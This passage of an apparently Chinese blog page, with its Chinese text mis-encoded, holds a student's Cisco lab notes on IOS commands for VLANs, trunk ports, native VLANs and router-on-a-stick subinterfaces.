class="hljs-symbol">vlan_id</span><br><span class="hljs-symbol">end</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨</strong>ï¼šä½¿ç”¨ <strong>interface range</strong> å‘½ä»¤å¯åŒæ—¶é…ç½®å¤šä¸ªæ¥å£ã€‚</p><h3 id="6-2-1-4-åˆ é™¤vlanåˆ†é…"><a href="#6-2-1-4-åˆ é™¤vlanåˆ†é…" class="headerlink" title="6.2.1.4 åˆ é™¤vlanåˆ†é…"></a>6.2.1.4 åˆ é™¤vlanåˆ†é…</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">configure terminal<br><span class="hljs-keyword">interface</span> <span class="hljs-symbol">f0</span>/<span class="hljs-symbol">18</span><br><span class="hljs-symbol">no</span> <span class="hljs-symbol">switchport</span> <span class="hljs-symbol">access</span> <span class="hljs-symbol">vlan</span><br><span class="hljs-symbol">end</span><br></code></pre></td></tr></table></figure><h3 id="6-2-1-5-åˆ é™¤"><a href="#6-2-1-5-åˆ é™¤" class="headerlink" title="6.2.1.5 åˆ é™¤"></a>6.2.1.5 åˆ é™¤</h3><p>no vlan vlan_id åˆ é™¤vlan</p><h2 id="6-2-1-7"><a href="#6-2-1-7" class="headerlink" title="6.2.1.7"></a>6.2.1.7</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Faculty/Staff<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#exit<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Students<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name <span class="hljs-constructor">Guest(Default)</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management&amp;Native<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-built_in">int</span> g0/<span class="hljs-number">1</span> <br>switchport mode trunk<br><span class="hljs-built_in">int</span> g0/<span class="hljs-number">2</span><br>switchport mode trunk<br><br><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span> <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Faculty/Staff<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Students<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name <span class="hljs-constructor">Guest(Default)</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management&amp;Native<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport mode access <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport access vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">18</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport mode access <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport access vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport mode access <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport access vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> tr<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> trunk <br><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Faculty/Staff<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Students<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name <span class="hljs-constructor">Guest(Default)</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management&amp;Native<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> ac<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> access <br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw acc vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">18</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> access <br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw acc vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> access <br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw acc vlan <span class="hljs-number">30</span><br><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">2</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw mode tr<br></code></pre></td></tr></table></figure><p>##5/25</p><h3 id="6-2-2-2-åŸç”Ÿvlan"><a href="#6-2-2-2-åŸç”Ÿvlan" class="headerlink" title="6.2.2.2 åŸç”Ÿvlan"></a>6.2.2.2 åŸç”Ÿvlan</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">switchport </span>mode trunk<br><span class="hljs-keyword">switchport </span>trunk native vlan vlan_id <span class="hljs-comment"># æŒ‡å®švlanç»™æ²¡æ ‡è®°çš„å¸§ åŸç”Ÿvlan</span><br><span class="hljs-keyword">switchport </span>trunk allowed vlan vlan-list <span class="hljs-comment"># æŒ‡å®šå¯ä»¥é€šè¿‡çš„vlanæ¸…å•</span><br><br>no <span class="hljs-keyword">switchport </span>trunk allowed vlan <span class="hljs-comment">#è®¾ä¸ºå…è®¸æ‰€æœ‰</span><br>no <span class="hljs-keyword">switchport </span>trunk native vlan <span class="hljs-comment">#å°†åŸç”Ÿvlané‡ç½®ä¸ºé»˜è®¤</span><br></code></pre></td></tr></table></figure><h3 id="6-3-3-3-å•è‡‚è·¯ç”±å™¨"><a href="#6-3-3-3-å•è‡‚è·¯ç”±å™¨" class="headerlink" title="6.3.3.3 å•è‡‚è·¯ç”±å™¨"></a>6.3.3.3 å•è‡‚è·¯ç”±å™¨</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200525222920883.png" class="" title="image-20200525222920883"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">interface</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">encapsulation</span> dotlq <span class="hljs-number">10</span><br><span class="hljs-attribute">ip</span> add<br><span class="hljs-attribute">interface</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">30</span><br><span class="hljs-attribute">encapsulation</span> dotlq <span class="hljs-number">30</span><br><br><span class="hljs-attribute">int</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span> shutdown<br></code></pre></td></tr></table></figure><h2 id="6-2-2-4"><a href="#6-2-2-4" class="headerlink" title="6.2.2.4"></a>6.2.2.4</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vim">S2S3å…ˆæŒ‰è¡¨åˆ†é…<br><br>S1<br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">2</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br><br>S2<br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br><br>S3<br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">2</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><h2 id="6-2-3-7"><a href="#6-2-3-7" class="headerlink" title="6.2.3.7"></a>6.2.3.7</h2><p>S3æœ‰bugï¼Œpc5æ¥åœ¨f0/17ä¸Š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> sw ac vlan <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> mo t<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> mo trunk <br><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> sw ac vlan <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vla <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">17</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vla <span class="hljs-number">20</span><br><br><br>PC6çš„ipæ”¹æˆ<span class="hljs-number">172.17</span>.<span class="hljs-number">30.26</span><br></code></pre></td></tr></table></figure><h2 id="6-2-3-8"><a href="#6-2-3-8" class="headerlink" title="6.2.3.8"></a>6.2.3.8</h2><p>æ’é”™ï¼Œå…ˆæ”¾è¿‡</p><h2 id="6-3-3-6"><a href="#6-3-3-6" class="headerlink" title="6.3.3.6"></a>6.3.3.6</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span>#ex<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk <br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> shut<br></code></pre></td></tr></table></figure><h2 id="6-3-3-8"><a href="#6-3-3-8" class="headerlink" title="6.3.3.8"></a>6.3.3.8</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> ad  <span class="hljs-number">172.17</span>.<span class="hljs-number">25.2</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.252</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.88</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">88</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">88.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.99</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">99</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">99.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> shut<br><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Faculty/Staff<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Students<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Guest(Default)<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">88</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Native<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">99</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Managemen<br><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> default-gateway <span class="hljs-number">172.17</span>.<span class="hljs-number">99.1</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> vlan99<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">99.10</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> shut<br><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span> <br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> t native vlan <span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><h2 id="6-4-1-2"><a href="#6-4-1-2" class="headerlink" title="6.4.1.2"></a>6.4.1.2</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R1(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>(config-<span class="hljs-keyword">if</span>)#ip ad <span class="hljs-number">172.31</span>.<span class="hljs-number">1.2</span> <span 